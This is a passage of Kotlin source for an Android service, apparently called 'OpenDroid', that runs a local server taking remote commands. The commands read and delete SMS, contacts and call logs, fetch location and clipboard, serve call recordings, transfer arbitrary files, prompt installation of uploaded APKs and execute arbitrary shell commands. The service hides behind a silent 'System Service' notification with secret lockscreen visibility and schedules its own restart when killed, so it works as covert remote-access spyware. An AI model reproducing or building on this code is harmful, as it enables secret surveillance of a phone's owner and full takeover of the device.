                val offset = json.optInt("offset", 0)
                val limit = json.optInt("limit", 25)
                serviceScope.launch(Dispatchers.IO) {
                    val pagedThreads = teleManager.getSmsThreadsPaged(offset, limit)
                    broadcastMessage(JSONObject().apply {
                        put("type", "SMS_THREADS_RESULT")
                        put("data", pagedThreads.getJSONArray("threads"))
                        put("offset", pagedThreads.getInt("offset"))
                        put("limit", pagedThreads.getInt("limit"))
                        put("total", pagedThreads.getInt("total"))
                        put("hasMore", pagedThreads.getBoolean("hasMore"))
                    }.toString())
                }
            }

            "FETCH_SMS_CONVERSATION" -> {
                val threadId = json.optLong("threadId", 0L)
                val address = json.optString("address", "")
                val offset = json.optInt("offset", 0)
                val limit = json.optInt("limit", 50)
                serviceScope.launch(Dispatchers.IO) {
                    val pagedMessages = teleManager.getThreadMessagesPaged(threadId, address, offset, limit)
                    broadcastMessage(JSONObject().apply {
                        put("type", "SMS_CONVERSATION_RESULT")
                        put("threadId", pagedMessages.getLong("threadId"))
                        put("address", pagedMessages.getString("address"))
                        put("contactName", pagedMessages.optString("contactName", ""))
                        put("messages", pagedMessages.getJSONArray("messages"))
                        put("offset", pagedMessages.getInt("offset"))
                        put("limit", pagedMessages.getInt("limit"))
                        put("total", pagedMessages.getInt("total"))
                        put("hasMore", pagedMessages.getBoolean("hasMore"))
                    }.toString())
                }
            }

            "DELETE_SMS_THREAD" -> {
                val threadId = json.optLong("threadId", 0L)
                val address = json.optString("address", "")
                serviceScope.launch(Dispatchers.IO) {
                    val success = teleManager.deleteSmsThread(threadId, address)
                    broadcastMessage(JSONObject().apply {
                        put("type", "SMS_THREAD_DELETED")
                        put("threadId", threadId)
                        put("address", address)
                        put("success", success)
                    }.toString())
                }
            }

            "FETCH_CONTACTS" -> {
                val offset = json.optInt("offset", 0)
                val limit = json.optInt("limit", 100)
                val paged = teleManager.getContactsPaged(offset, limit)
                broadcastMessage(JSONObject().apply {
                    put("type", "CONTACTS_LIST")
                    put("data", paged.getJSONArray("data"))
                    put("offset", paged.getInt("offset"))
                    put("limit", paged.getInt("limit"))
                    put("total", paged.getInt("total"))
                    put("hasMore", paged.getBoolean("hasMore"))
                }.toString())
            }

            "DELETE_CALL_LOG" -> {
                val id = if (json.has("id")) json.optLong("id", -1L) else -1L
                val number = json.optString("number", "")
                val date = if (json.has("date")) json.optLong("date", -1L) else -1L
                teleManager.deleteCallLog(if (id > 0) id else null, number, if (date > 0) date else null)
                val paged = teleManager.getCallLogsPaged(0, 100)
                broadcastMessage(JSONObject().apply {
                    put("type", "CALL_LOGS_LIST")
                    put("data", paged.getJSONArray("data"))
                    put("offset", 0)
                    put("limit", 100)
                    put("total", paged.getInt("total"))
                    put("hasMore", paged.getBoolean("hasMore"))
                }.toString())
            }

            "CLEAR_CALL_LOGS" -> {
                teleManager.clearCallLogs()
                broadcastMessage(JSONObject().apply {
                    put("type", "CALL_LOGS_LIST")
                    put("data", JSONArray())
                    put("offset", 0)
                    put("limit", 100)
                    put("total", 0)
                    put("hasMore", false)
                }.toString())
            }

            "ADD_CONTACT" -> {
                val name = json.optString("name", "")
                val number = json.optString("number", "")
                val email = json.optString("email", "")
                if (name.isNotEmpty() && number.isNotEmpty()) {
                    teleManager.addContact(name, number, if (email.isNotEmpty()) email else null)
                }
                val paged = teleManager.getContactsPaged(0, 100)
                broadcastMessage(JSONObject().apply {
                    put("type", "CONTACTS_LIST")
                    put("data", paged.getJSONArray("data"))
                    put("offset", 0)
                    put("limit", 100)
                    put("total", paged.getInt("total"))
                    put("hasMore", paged.getBoolean("hasMore"))
                }.toString())
            }

            // Phase 13: Full Bi-Directional Contact Update Engine
            "UPDATE_CONTACT" -> {
                val id = json.optLong("id", -1L)
                val name = json.optString("name", "")
                val number = json.optString("number", "")
                val email = json.optString("email", "")
                val success = if (id > 0 && name.isNotEmpty() && number.isNotEmpty()) {
                    teleManager.updateContact(id, name, number, if (email.isNotEmpty()) email else null)
                } else false
                val paged = teleManager.getContactsPaged(0, 100)
                broadcastMessage(JSONObject().apply {
                    put("type", "CONTACTS_LIST")
                    put("data", paged.getJSONArray("data"))
                    put("offset", 0)
                    put("limit", 100)
                    put("total", paged.getInt("total"))
                    put("hasMore", paged.getBoolean("hasMore"))
                    put("actionStatus", if (success) "UPDATED" else "FAILED")
                }.toString())
            }

            "DELETE_CONTACT" -> {
                val id = if (json.has("id")) json.optLong("id", -1L) else -1L
                val number = json.optString("number", "")
                teleManager.deleteContact(if (id > 0) id else null, number)
                val paged = teleManager.getContactsPaged(0, 100)
                broadcastMessage(JSONObject().apply {
                    put("type", "CONTACTS_LIST")
                    put("data", paged.getJSONArray("data"))
                    put("offset", 0)
                    put("limit", 100)
                    put("total", paged.getInt("total"))
                    put("hasMore", paged.getBoolean("hasMore"))
                }.toString())
            }

            // Phase 13: Batch / Bulk Delete Contacts Handler
            "BULK_DELETE_CONTACTS" -> {
                val idsArray = json.optJSONArray("ids") ?: JSONArray()
                val idsList = mutableListOf<Long>()
                for (i in 0 until idsArray.length()) {
                    val contactId = idsArray.optLong(i, -1L)
                    if (contactId > 0) idsList.add(contactId)
                }
                val deletedCount = if (idsList.isNotEmpty()) teleManager.bulkDeleteContacts(idsList) else 0
                val paged = teleManager.getContactsPaged(0, 100)
                broadcastMessage(JSONObject().apply {
                    put("type", "CONTACTS_LIST")
                    put("data", paged.getJSONArray("data"))
                    put("offset", 0)
                    put("limit", 100)
                    put("total", paged.getInt("total"))
                    put("hasMore", paged.getBoolean("hasMore"))
                    put("deletedCount", deletedCount)
                }.toString())
            }

            // Phase 13: Export All Contacts to vCard 3.0 (.vcf)
            "EXPORT_VCF" -> {
                serviceScope.launch(Dispatchers.IO) {
                    try {
                        val vcfText = teleManager.exportContactsToVcf()
                        broadcastMessage(JSONObject().apply {
                            put("type", "CONTACTS_VCF_EXPORTED")
                            put("vcf", vcfText)
                            put("timestamp", System.currentTimeMillis())
                        }.toString())
                    } catch (e: Exception) {
                        broadcastMessage(JSONObject().apply {
                            put("type", "CONTACTS_VCF_EXPORTED")
                            put("vcf", "")
                            put("error", e.message ?: "Export failed")
                        }.toString())
                    }
                }
            }

            // Phase 13: Bulk Import Contacts from vCard 3.0 (.vcf)
            "IMPORT_VCF" -> {
                val vcfData = json.optString("vcf", "")
                serviceScope.launch(Dispatchers.IO) {
                    val importedCount = if (vcfData.isNotEmpty()) {
                        teleManager.importContactsFromVcf(vcfData)
                    } else 0
                    val paged = teleManager.getContactsPaged(0, 100)
                    broadcastMessage(JSONObject().apply {
                        put("type", "CONTACTS_VCF_IMPORTED")
                        put("count", importedCount)
                        put("data", paged.getJSONArray("data"))
                        put("offset", 0)
                        put("limit", 100)
                        put("total", paged.getInt("total"))
                        put("hasMore", paged.getBoolean("hasMore"))
                    }.toString())
                }
            }

            "FETCH_STORAGE" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "STORAGE_STATS")
                    put("data", teleManager.getStorageStats())
                }.toString())
            }

            "FETCH_LOCATION" -> {
                broadcastMessage(teleManager.getLocation().toString())
            }

            "FETCH_CLIPBOARD" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "CLIPBOARD_DATA")
                    put("text", teleManager.getClipboardText())
                }.toString())
            }

            "SET_CLIPBOARD" -> {
                val text = json.optString("text", "")
                teleManager.setClipboardText(text)
                broadcastMessage(JSONObject().apply {
                    put("type", "CLIPBOARD_SET_ACK")
                    put("success", true)
                }.toString())
            }

            // --- Chunked File Transfer ---
            "DOWNLOAD_FILE_CHUNK" -> {
                val path = json.optString("path", "")
                val offset = json.optLong("offset", 0L)
                val chunkObj = teleManager.readFileChunk(path, offset)
                broadcastMessage(JSONObject().apply {
                    put("type", "FILE_DOWNLOAD_CHUNK")
                    put("data", chunkObj)
                }.toString())
            }

            // --- Phase 20: Remote Web Terminal & Shell Runner ---
            "EXEC_SHELL" -> {
                val command = json.optString("command", "").trim()
                val reqId = json.optString("requestId", "")
                serviceScope.launch(Dispatchers.IO) {
                    try {
                        if (command.isEmpty()) {
                            val res = JSONObject().apply {
                                put("type", "SHELL_OUTPUT")
                                put("requestId", reqId)
                                put("output", "Error: Empty command provided.")
                                put("exitCode", 1)
                            }.toString()
                            broadcastMessage(res)
                            return@launch
                        }

                        val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
                        var stdout = ""
                        var stderr = ""
                        val exited = withTimeoutOrNull(15000L) {
                            val outJob = async { process.inputStream.bufferedReader().readText() }
                            val errJob = async { process.errorStream.bufferedReader().readText() }
                            stdout = outJob.await()
                            stderr = errJob.await()
                            process.waitFor()
                        }

                        val exitCode = exited ?: run {
                            process.destroyForcibly()
                            -1
                        }

                        val combinedOutput = when {
                            exited == null -> "$stdout\n[TIMEOUT ]: Command exceeded 15s limit and was terminated."
                            stderr.isNotEmpty() && stdout.isNotEmpty() -> "$stdout\n$stderr"
                            stderr.isNotEmpty() -> stderr
                            stdout.isNotEmpty() -> stdout
                            else -> "[Process exited with code $exitCode]"
                        }

                        val res = JSONObject().apply {
                            put("type", "SHELL_OUTPUT")
                            put("requestId", reqId)
                            put("command", command)
                            put("output", combinedOutput)
                            put("exitCode", exitCode)
                        }.toString()
                        broadcastMessage(res)
                    } catch (e: Exception) {
                        val errRes = JSONObject().apply {
                            put("type", "SHELL_OUTPUT")
                            put("requestId", reqId)
                            put("command", command)
                            put("output", "Execution failed: ${e.message}")
                            put("exitCode", -1)
                        }.toString()
                        broadcastMessage(errRes)
                    }
                }
            }

            // --- Phase 21: 1-Click APK Extractor & Backup ---
            "EXTRACT_APK" -> {
                val packageName = json.optString("package", "").trim()
                serviceScope.launch(Dispatchers.IO) {
                    try {
                        val appInfo = packageManager.getApplicationInfo(packageName, 0)
                        val apkFile = java.io.File(appInfo.sourceDir)
                        if (apkFile.exists()) {
                            val appLabel = packageManager.getApplicationLabel(appInfo).toString().replace(Regex("[^a-zA-Z0-9_]"), "_")
                            val cleanFilename = "${appLabel}_${packageName}.apk"
                            
                            val res = JSONObject().apply {
                                put("type", "APK_EXTRACTED")
                                put("package", packageName)
                                put("filename", cleanFilename)
                                put("size", apkFile.length())
                                put("path", apkFile.absolutePath)
                            }.toString()
                            broadcastMessage(res)
                        } else {
                            broadcastMessage(JSONObject().apply {
                                put("type", "APK_EXTRACT_ERROR")
                                put("package", packageName)
                                put("error", "APK file not found on device storage")
                            }.toString())
                        }
                    } catch (e: Exception) {
                        broadcastMessage(JSONObject().apply {
                            put("type", "APK_EXTRACT_ERROR")
                            put("package", packageName)
                            put("error", e.message ?: "Failed to extract APK")
                        }.toString())
                    }
                }
            }

            "UPLOAD_FILE_CHUNK" -> {
                val fileName = json.optString("fileName", "")
                val targetPath = json.optString("targetPath", "")
                val data = json.optString("data", "")
                val isFirst = json.optBoolean("isFirst", false)
                val isLast = json.optBoolean("isLast", false)
                val success = teleManager.saveUploadedChunk(targetPath, fileName, data, isFirst, isLast)
                if (isLast) {
                    broadcastMessage(JSONObject().apply {
                        put("type", "FILE_UPLOAD_COMPLETE")
                        put("fileName", fileName)
                    }.toString())
                } else {
                    broadcastMessage(JSONObject().apply {
                        put("type", "FILE_UPLOAD_CHUNK_ACK")
                        put("fileName", fileName)
                    }.toString())
                }
            }
        }
    }

        private fun broadcastCallRecordingsList() {
        try {
            val callRecorder = CallRecordingManager.getInstance(applicationContext)
            val files = callRecorder.getRecordedCalls()
            val array = JSONArray()
            files.forEach { file ->
                val parts = file.nameWithoutExtension.split("_")
                val number = if (parts.size >= 4) parts.drop(3).joinToString("_") else "Unknown"
                val obj = JSONObject().apply {
                    put("name", file.name)
                    put("size", file.length())
                    put("modified", file.lastModified())
                    put("number", number)
                    put("url", "/api/call_recordings/${file.name}")
                }
                array.put(obj)
            }
            broadcastMessage(JSONObject().apply {
                put("type", "CALL_RECORDINGS_LIST")
                put("data", array)
            }.toString())
        } catch (e: Exception) {
            Log.e("LocalFileServer", "Error fetching call recordings", e)
        }
    }

    private fun playRingtone() {
        try {
            stopRingtone()
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)

            val alert: Uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)

            currentRingtone = RingtoneManager.getRingtone(applicationContext, alert).apply {
                audioAttributes = AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_ALARM)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build()
                play()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun stopRingtone() {
        try {
            currentRingtone?.stop()
            currentRingtone = null
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun startServer() {
        if (isServerStartingOrRunning) return
        isServerStartingOrRunning = true

        serviceScope.launch {
            try {
                server = embeddedServer(CIO, port = PORT) {
                    fileServerModule(baseDir)
                }.start(wait = true)
            } catch (e: Exception) {
                e.printStackTrace()
                isServerStartingOrRunning = false
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN // IMPORTANCE_MIN: No status bar icon, completely silent & collapsed
            ).apply {
                description = "Background System Synchronization"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopHardwareTelemetryStream()
        unregisterReceiver(batteryReceiver)
        try { WebRtcManager.getInstance(applicationContext).stopCapture() } catch (_: Exception) {}
        try { smsObserver?.let { contentResolver.unregisterContentObserver(it) } } catch (_: Exception) {}

        // Immortal Self-Healing Watchdog: Auto-restart service if killed or dismissed
        try {
            if (boundAccountEmail.isNotEmpty()) {
                val restartIntent = Intent(applicationContext, LocalFileServerService::class.java).apply {
                    setPackage(packageName)
                    putExtra("PAIRING_CODE", currentPairingCode)
                }
                val restartPendingIntent = PendingIntent.getService(
                    applicationContext,
                    1,
                    restartIntent,
                    PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                )
                val alarmService = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
                alarmService?.setAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 1500,
                    restartPendingIntent
                )
                Log.d("OpenDroid", "Scheduled immediate self-revive in onDestroy")
            }
        } catch (e: Exception) {
            Log.e("OpenDroid", "Error scheduling onDestroy restart", e)
        }
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
        } catch (e: Exception) { e.printStackTrace() }
        stopRingtone()
        try {
            mqttClient?.disconnect()
            mqttClient?.close()
        } catch (e: Exception) { e.printStackTrace() }
        server?.stop(1000, 2000)
        isServerStartingOrRunning = false
        instance = null
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun Application.fileServerModule(directory: File) {
        install(WebSockets)

        routing {
            get("/") {
                val html = try {
                    assets.open("index.html").bufferedReader().use { it.readText() }
                } catch (e: Exception) {
                    "<html><body><h1>OpenDroid Server Running</h1></body></html>"
                }
                call.respondText(html, ContentType.Text.Html)
            }

            get("/api/files") {
                val files = directory.listFiles()?.map {
                    JSONObject().put("name", it.name).put("size", it.length()).put("isDirectory", it.isDirectory)
                } ?: emptyList()
                call.respondText(JSONArray(files).toString(), ContentType.Application.Json)
            }

                        get("/api/call_recordings") {
                val files = CallRecordingManager.getInstance(applicationContext).getRecordedCalls().map {
                    JSONObject().put("name", it.name).put("size", it.length()).put("modified", it.lastModified())
                }
                call.respondText(JSONArray(files).toString(), ContentType.Application.Json)
            }

            get("/api/call_recordings/{name}") {
                val name = call.parameters["name"] ?: ""
                val file = CallRecordingManager.getInstance(applicationContext).getRecordingFile(name)
                if (file != null && file.exists()) {
                    call.respondBytes(file.readBytes(), ContentType.parse("audio/wav"))
                } else {
                    call.respondText("Not Found", status = HttpStatusCode.NotFound)
                }
            }

            // Phase 15: High-Speed LAN Media Streamer (HTTP 206 Partial Content / Range Requests)
            get("/api/media/stream") {
                val path = call.request.queryParameters["path"] ?: ""
                val uriStr = call.request.queryParameters["uri"] ?: ""
                val file = if (path.isNotEmpty()) File(path) else null
                if (file != null && file.exists() && file.canRead()) {
                    call.respondFile(file)
                } else {
                    val targetUri = if (uriStr.isNotEmpty()) Uri.parse(uriStr) else if (path.startsWith("content://")) Uri.parse(path) else null
                    if (targetUri != null) {
                        try {
                            val pfd = contentResolver.openFileDescriptor(targetUri, "r")
                            if (pfd != null) {
                                val mime = contentResolver.getType(targetUri) ?: "application/octet-stream"
                                call.respondOutputStream(ContentType.parse(mime)) {
                                    java.io.FileInputStream(pfd.fileDescriptor).use { input ->
                                        input.copyTo(this, bufferSize = 64 * 1024)
                                    }
                                }
                                pfd.close()
                            } else {
                                call.respondText("Media not found", status = HttpStatusCode.NotFound)
                            }
                        } catch (e: Exception) {
                            call.respondText("Stream error: ${e.message}", status = HttpStatusCode.InternalServerError)
                        }
                    } else {
                        call.respondText("File not found", status = HttpStatusCode.NotFound)
                    }
                }
            }

            get("/api/media/thumbnail") {
                val path = call.request.queryParameters["path"] ?: ""
                val uriStr = call.request.queryParameters["uri"] ?: ""
                val type = call.request.queryParameters["type"] ?: "photo"
                val maxDim = call.request.queryParameters["maxDim"]?.toIntOrNull() ?: 256
                val target = if (uriStr.isNotEmpty()) uriStr else path
                val thumbBase64 = if (type == "video") {
                    teleManager.getVideoThumbnailBase64(target, maxDim)
                } else {
                    teleManager.getPhotoThumbnailBase64(target, maxDim)
                }
                if (thumbBase64 != null) {
                    val bytes = android.util.Base64.decode(thumbBase64, android.util.Base64.NO_WRAP)
                    call.respondBytes(bytes, ContentType.parse("image/webp"))
                } else {
                    call.respondText("Thumbnail failed", status = HttpStatusCode.NotFound)
                }
            }

            post("/upload") {
                val targetDirParam = call.request.queryParameters["targetPath"]
                val destDir = if (!targetDirParam.isNullOrEmpty()) File(targetDirParam) else directory
                if (!destDir.exists()) destDir.mkdirs()

                var lastUploadedName = ""
                val multipart = call.receiveMultipart()
                multipart.forEachPart { part ->
                    if (part is PartData.FileItem) {
                        val fileName = part.originalFileName ?: "uploaded_file"
                        lastUploadedName = fileName
                        val file = File(destDir, fileName)
                        part.streamProvider().use { input ->
                            file.outputStream().buffered().use { output ->
                                input.copyTo(output)
                            }
                        }
                    }
                    part.dispose()
                }

                // If uploaded file is an APK, auto-prompt installation
                if (lastUploadedName.endsWith(".apk", ignoreCase = true)) {
                    val apkFile = File(destDir, lastUploadedName)
                    if (apkFile.exists()) {
                        try {
                            val apkUri = androidx.core.content.FileProvider.getUriForFile(
                                applicationContext,
                                "${packageName}.provider",
                                apkFile
                            )
                            val intent = Intent(Intent.ACTION_VIEW).apply {
                                setDataAndType(apkUri, "application/vnd.android.package-archive")
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                            }
                            startActivity(intent)
                        } catch (e: Exception) {
                            Log.e("OpenDroid", "Auto-install APK error", e)
                        }
                    }
                }
                call.respondText("Upload Complete", ContentType.Text.Plain)
            }

            get("/api/download") {
                val filePath = call.request.queryParameters["path"] ?: ""
                val file = File(filePath)
                if (file.exists() && file.isFile) {
                    call.respondBytes(file.readBytes(), ContentType.Application.OctetStream)
                } else {
                    call.respondText("File Not Found", status = HttpStatusCode.NotFound)
                }
            }

            webSocket("/ws") {
                launch {
                    for (msg in wsMessageChannel) {
                        send(Frame.Text(msg))
                    }
                }
                for (frame in incoming) {
                    if (frame is Frame.Text) {
                        val text = frame.readText()
                        serviceScope.launch(Dispatchers.IO) {
                            try {
                                handleIncomingJson(JSONObject(text))
                            } catch (e: Exception) {
                                e.printStackTrace()
                            }
                        }
                    }
                }
            }
        }
    }
}






 